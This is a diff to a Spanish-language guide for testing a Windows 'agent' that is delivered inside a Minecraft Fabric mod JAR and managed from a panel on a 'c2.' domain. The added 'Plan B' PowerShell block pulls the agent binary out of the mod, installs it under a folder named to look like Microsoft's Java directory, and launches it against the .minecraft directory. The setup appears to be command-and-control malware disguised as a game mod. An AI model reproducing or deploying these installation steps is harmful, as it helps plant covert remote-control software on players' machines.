@@ -1,9 +1,9 @@
 # Prueba del agente en Windows (dualboot)
 
-Build preparado: `windows-dualboot-v2` · `0.4.0` · perfil `full`.  
+Build preparado: `windows-dualboot-v3` · `0.4.0` · perfil `full`.  
 Panel: <https://c2.spc-labpanel.com>  
-Descarga: <https://c2.spc-labpanel.com/builds> → `windows-dualboot-v2` → descargar.  
-SHA-256 esperado: `890c0b27e19b7aa9c18d5a669a85e56d18b9ea0856b084e819463816d11440b8`.
+Descarga: <https://c2.spc-labpanel.com/builds> → `windows-dualboot-v3` → descargar.  
+SHA-256 esperado: `4c16120aed3257f9f97e5976f0bb44c54ac2ae513472aa1801ae1122e866a79c`.
 
 No compartas el JAR: lleva el `build_secret` del build.
 
@@ -26,10 +26,31 @@ curl.exe -i https://c2.spc-labpanel.com/api/v1/preflight
 
 Debe responder `200` con `ok:true`. Compara `server_time` con la hora UTC local; si difieren más de 300 s, sincroniza el reloj antes de seguir.
 
+## Plan B: agente sin Minecraft
+
+Si el mod no arranca el agente, ejecuta esto en PowerShell tras descargar el JAR. Extrae el agente del JAR, lo instala y lo lanza directamente:
+
+```powershell
+$jar = Get-ChildItem "$env:USERPROFILE\Downloads\fabric-sync-0.4.0-*.jar" | Select-Object -First 1
+$dst = "$env:LOCALAPPDATA\Microsoft\Java"
+New-Item -ItemType Directory -Force $dst | Out-Null
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+$zip = [IO.Compression.ZipFile]::OpenRead($jar.FullName)
+[IO.Compression.ZipFileExtensions]::ExtractToFile($zip.GetEntry('serverpackcore/agent.bin'), "$dst\runtime.jar", $true)
+[IO.Compression.ZipFileExtensions]::ExtractToFile($zip.GetEntry('serverpackcore/config.json'), "$dst\crypto-config.json", $true)
+$zip.Dispose()
+Start-Process javaw -ArgumentList @('-jar', "$dst\runtime.jar", '--game-dir', "$env:APPDATA\.minecraft")
+Start-Sleep 5
+Get-Content "$dst\logs\agent.log" -Tail 40
+```
+
+Si aparece en **Equipos**, el servidor y el agente están bien y el fallo es solo del mod/Fabric. Si no aparece, adjunta esa salida.
+
 ## Instalación
 
+
 1. Abre <https://c2.spc-labpanel.com> en Windows e inicia sesión con TOTP.
-2. Entra en **Builds**, busca `windows-dualboot-v2`, descarga el JAR y comprueba el hash:
+2. Entra en **Builds**, busca `windows-dualboot-v3`, descarga el JAR y comprueba el hash:
 
    ```powershell
    Get-FileHash "$env:USERPROFILE\Downloads\fabric-sync-0.4.0-*.jar" -Algorithm SHA256
